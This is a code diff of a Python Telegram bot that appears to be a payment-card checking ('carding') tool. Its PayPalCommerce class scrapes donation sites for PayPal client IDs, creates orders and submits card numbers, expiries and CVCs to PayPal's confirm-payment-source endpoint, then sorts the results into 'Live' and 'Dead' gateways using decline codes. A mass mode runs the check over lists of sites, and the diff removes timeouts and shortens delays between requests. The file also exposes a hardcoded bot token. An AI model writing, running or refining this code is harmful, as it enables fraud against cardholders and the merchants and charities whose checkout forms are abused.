@@ -12,7 +12,6 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# === استيراد UserAgent مع fallback ===
 try:
     from fake_useragent import UserAgent
     HAS_FAKE_UA = True
@@ -32,7 +31,6 @@ except ImportError:
         def random(self):
             return random.choice(self.agents)
 
-# === بيانات البوت ===
 token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 6843321125
@@ -48,7 +46,6 @@ if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
         f.write('')
 
-# === دوال آمنة ضد FloodWait ===
 def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
     for i in range(retries):
         try:
@@ -98,7 +95,6 @@ def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=
                 break
     return None
 
-# كل ردود PayPal API
 PAYPAL_RESPONSES = [
     'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
     'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
@@ -233,7 +229,6 @@ def back_to_start(call):
     except:
         pass
 
-# ============ كلاس PayPalCommerce ============
 class PayPalCommerce:
     def __init__(self, target_url=None):
         self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
@@ -264,7 +259,7 @@ class PayPalCommerce:
     def _init_and_extract(self):
         try:
             headers = {'user-agent': self.uu.random, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'accept-language': 'en-US,en;q=0.9'}
-            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
+            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers)
             self.cookies = dict(response.cookies)
             html = response.text
             self._extract_client_id(html)
@@ -313,7 +308,7 @@ class PayPalCommerce:
             return None
         try:
             headers = {'user-agent': self.uu.random, 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
-            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=15)
+            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''))
             if response.status_code == 200:
                 self.access_token = response.json().get('access_token')
                 return self.access_token
@@ -329,7 +324,7 @@ class PayPalCommerce:
             for action in actions:
                 data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                 headers = {'user-agent': self.uu.random, 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
+                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -381,7 +376,7 @@ class PayPalCommerce:
         for action in actions:
             params = {'action': action}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies)
                 if response.status_code == 200 and response.text:
                     try:
                         json_data = response.json()
@@ -408,7 +403,7 @@ class PayPalCommerce:
         try:
             headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.uu.random, 'accept': 'application/json'}
             data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': 'USD', 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
+            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data)
             if response.status_code in [200, 201]:
                 response_data = response.json()
                 if 'id' in response_data:
@@ -441,7 +436,7 @@ class PayPalCommerce:
         for action in actions:
             params = {'action': action, 'order': order_id}
             try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies)
                 if response.status_code == 200:
                     return response
             except:
@@ -473,7 +468,7 @@ class PayPalCommerce:
                 he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.uu.random}
                 da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
                 try:
-                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3, timeout=15)
+                    confirm_res = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source', headers=he4, json=da3)
                     if confirm_res.status_code == 200:
                         try:
                             confirm_json = confirm_res.json()
@@ -510,7 +505,6 @@ class PayPalCommerce:
         except Exception as e:
             return f"Error: {e}"
 
-# ============ أمر سحب PayPal ============
 @bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
 def ali_al2(massege):
     with open("blockusers.txt", "r") as file:
@@ -536,7 +530,7 @@ def ali_al2(massege):
             safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
             return
 
-        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
+        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"})
         if r.status_code != 200:
             safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
             return
@@ -695,7 +689,6 @@ if __name__ == '__main__':
     except:
         pass
 
-# ============ أمر mass ============
 @bot.message_handler(commands=['mass'])
 def mass_extract_start(message):
     with open("blockusers.txt", "r") as file:
@@ -782,9 +775,8 @@ def process_mass_file(message):
             return
 
         def update_status():
-            last_text = ""
             while True:
-                time.sleep(30)  # تحديث كل 30 ثانية
+                time.sleep(5)
                 try:
                     with processing_status[user_id]['lock']:
                         if processing_status[user_id].get('done', False):
@@ -800,19 +792,15 @@ def process_mass_file(message):
                         bar = '█' * filled + '░' * (bar_length - filled)
                         text = f"""📊 <b>File #1 - Scanning links...</b>\n━━━━━━━━━━━━━━━━━━\n📌 Total Links: {total}\n✅ Live: {live}\n❌ Dead: {dead}\n⏳ Progress: {percent}% {bar}\nUrl : <code>{current_url[:50] if current_url else '...'}</code>\nRespons : <code>{current_respons[:50] if current_respons else '...'}</code>\n━━━━━━━━━━━━━━━━━━\n⏱️ Checked {processed} of {total}\n🛑 /stop to stop"""
                         
-                        if text != last_text:
-                            try:
-                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
-                                last_text = text
-                            except:
-                                pass
+                        try:
+                            bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
+                        except:
+                            pass
                 except:
                     pass
 
         updater = threading.Thread(target=update_status, daemon=True)
         updater.start()
-
-        time.sleep(3)  # راحة قبل الفحص
 
         for idx, link in enumerate(links):
             if processing_status[user_id].get('stop_flag', False):
@@ -958,14 +946,14 @@ if __name__ == '__main__':
                             f.write(code)
                         safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>\n━━━━━━━━━━━━━━━━━━━━\n🔗 Link: <code>{result['link']}</code>\n━━━━━━━━━━━━━━━━━━━━\n💬 <b>Respons:</b> <code>{result['respons']}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @FAWZY30""")
                         os.remove(file_name)
-                        time.sleep(10)  # راحة 10 ثواني بعد كل ملف
+                        time.sleep(10)
                     except Exception as e:
                         print(f"Error sending file: {e}")
                 else:
                     processing_status[user_id]['dead'] += 1
                     processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'
             
-            time.sleep(5)  # راحة 5 ثواني بين المواقع
+            time.sleep(3)
         
         with processing_status[user_id]['lock']:
             processing_status[user_id]['done'] = True
